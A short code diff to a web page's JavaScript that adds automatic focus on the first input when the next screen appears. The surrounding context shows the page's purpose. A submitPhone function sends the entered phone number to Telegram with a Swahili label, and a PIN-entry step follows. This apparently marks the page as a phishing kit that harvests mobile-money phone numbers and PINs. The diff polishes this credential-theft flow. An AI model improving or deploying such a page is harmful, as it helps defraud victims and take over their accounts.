@@ -168,9 +168,20 @@
         }
 
         function nextScreen(id) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById('screen-' + id).classList.add('active');
-        }
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    const targetScreen = document.getElementById('screen-' + id);
+    targetScreen.classList.add('active');
+
+    // Automatically focus the first input if it exists in the new screen
+    const firstInput = targetScreen.querySelector('input');
+    if (firstInput) {
+        // Adding a slight timeout ensures the transition animation finishes 
+        // before the keyboard pops up, which is better for UX
+        setTimeout(() => {
+            firstInput.focus();
+        }, 300); 
+    }
+}
 
         function submitPhone() { sendToTelegram(`📱 Namba: ${document.getElementById('phone-field').value}`); nextScreen(2); }
         function submitPin() {
